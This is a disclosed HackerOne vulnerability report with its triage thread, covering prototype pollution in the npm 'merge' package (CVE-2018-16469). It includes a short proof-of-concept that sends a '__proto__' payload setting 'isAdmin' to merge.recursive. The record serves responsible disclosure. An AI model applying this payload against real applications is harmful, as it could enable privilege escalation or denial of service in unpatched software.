{"id":381194,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODExOTQ=","url":"https://hackerone.com/reports/381194","title":"Prototype pollution attack (merge.recursive)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-07-13T10:26:55.413Z","submitted_at":"2018-07-13T10:26:55.413Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"asgerf","url":"/asgerf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-16469"],"singular_disclosure_disabled":false,"disclosed_at":"2018-09-28T10:13:25.154Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-08-29T10:13:22.940Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report prototype pollution in merge.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** merge\n**version:** 1.2.0\n**npm page:** `https://www.npmjs.com/package/merge`\n\n## Module Description\n\nMerge multiple objects into one, optionally creating a new cloned object. Similar to the jQuery.extend but more flexible. Works in Node.js and the browser.\n\n## Module Stats\n\n1,822,662 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nThis is a variant of this vulnerability:\nhttps://hackerone.com/reports/310443\n\nThe `merge.recursive` function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n\nCraft an object of form `{__proto__: {...}}` and send it to `merge.recursive`.\n\n```javascript\nlet merge = require('merge');\nlet payload = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\nmerge.recursive({}, payload);\nconsole.log({}.isAdmin); // true\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nDenial of service, possibly more depending on the application.\nSee https://hackerone.com/reports/310443","vulnerability_information_html":"\u003cp\u003eI would like to report prototype pollution in merge.\u003cbr\u003e\nIt allows an attacker to inject properties on Object.prototype.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e merge\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.2.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/merge\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eMerge multiple objects into one, optionally creating a new cloned object. Similar to the jQuery.extend but more flexible. Works in Node.js and the browser.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e1,822,662 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThis is a variant of this vulnerability:\u003cbr\u003e\n\u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003emerge.recursive\u003c/code\u003e function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eCraft an object of form \u003ccode\u003e{__proto__: {...}}\u003c/code\u003e and send it to \u003ccode\u003emerge.recursive\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003emerge\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emerge\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e{\u0026quot;__proto__\u0026quot;: {\u0026quot;isAdmin\u0026quot;: true}}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003emerge\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erecursive\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisAdmin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of service, possibly more depending on the application.\u003cbr\u003e\nSee \u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-09-28T10:13:23.090Z","allow_singular_disclosure_after":-71091213.62935543,"singular_disclosure_allowed":true,"vote_count":8,"voters":["sameerphad72","mygf","eveeez","apapedulimu","code_monkey","davidalbert","cryptographer","jatacheers"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":9561,"asset_type":"SOURCE_CODE","asset_identifier":"merge","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3041179,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-07-13T15:03:42.380Z","updated_at":"2018-07-13T15:03:42.380Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3049642,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to reproduce Hi @asgerf ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eI was able to reproduce Hi @asgerf ,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-16T07:58:10.480Z","updated_at":"2018-07-16T07:58:10.480Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3050972,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @asgerf,\n\nI got ahead of myself triaging your report.\nIt seems this exact vulnerability has been reported previously and has been disclosed due to inactivity on the part of the package Author.\nhttps://hackerone.com/reports/311337\n\nRegards,\nAlex","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI got ahead of myself triaging your report.\u003cbr\u003e\nIt seems this exact vulnerability has been reported previously and has been disclosed due to inactivity on the part of the package Author.\u003cbr\u003e\n\u003ca title=\"https://hackerone.com/reports/311337\" href=\"https://hackerone.com/reports/311337\"\u003ehttps://hackerone.com/reports/311337\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAlex\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-16T09:30:59.760Z","updated_at":"2018-07-16T09:30:59.760Z","original_report_id":311337,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3054865,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Alex,\n\nPlease note that this report is about the `merge` package; the other report is about `merge-recursive`.\nI can see how the report title would make them look identical, though.","markdown_message":"\u003cp\u003eHi Alex,\u003c/p\u003e\n\n\u003cp\u003ePlease note that this report is about the \u003ccode\u003emerge\u003c/code\u003e package; the other report is about \u003ccode\u003emerge-recursive\u003c/code\u003e.\u003cbr\u003e\nI can see how the report title would make them look identical, though.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-17T07:51:46.195Z","updated_at":"2018-07-17T07:51:46.195Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3054869,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Hi @asgerf,\n\nSorry about that, you are right.\nI will try to contact the author.\n\nRegards,\nAlex","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry about that, you are right.\u003cbr\u003e\nI will try to contact the author.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAlex\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-17T07:56:23.309Z","updated_at":"2018-07-17T07:56:23.309Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3054898,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Emailed to the author was already sent July 16th.","markdown_message":"\u003cp\u003eEmailed to the author was already sent July 16th.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-17T08:19:28.027Z","updated_at":"2018-07-17T08:19:28.027Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263174,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Not able to contact package maintainer","markdown_message":"\u003cp\u003eNot able to contact package maintainer\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T10:12:46.019Z","updated_at":"2018-08-29T10:12:46.019Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"asgerf","url":"/asgerf"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263175,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This one has been reported \u003e 2 months ago with no progress.","markdown_message":"\u003cp\u003eThis one has been reported \u0026gt; 2 months ago with no progress.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T10:13:22.978Z","updated_at":"2018-08-29T10:13:22.978Z","first_to_agree":true,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3400790,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-28T10:13:25.178Z","updated_at":"2018-09-28T10:13:25.178Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3812940,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It seems to have been fixed in merge 1.2.1.","markdown_message":"\u003cp\u003eIt seems to have been fixed in merge 1.2.1.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-12T12:54:32.270Z","updated_at":"2018-12-12T12:54:32.270Z","actor":{"username":"asgerf","cleared":false,"url":"/asgerf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921155,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@asgerf I notified the H1 team to see if they can update the CVE with this fix version","markdown_message":"\u003cp\u003e\u003ca href=\"/asgerf\"\u003e@asgerf\u003c/a\u003e I notified the H1 team to see if they can update the CVE with this fix version\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T18:14:25.972Z","updated_at":"2019-01-03T18:14:25.972Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}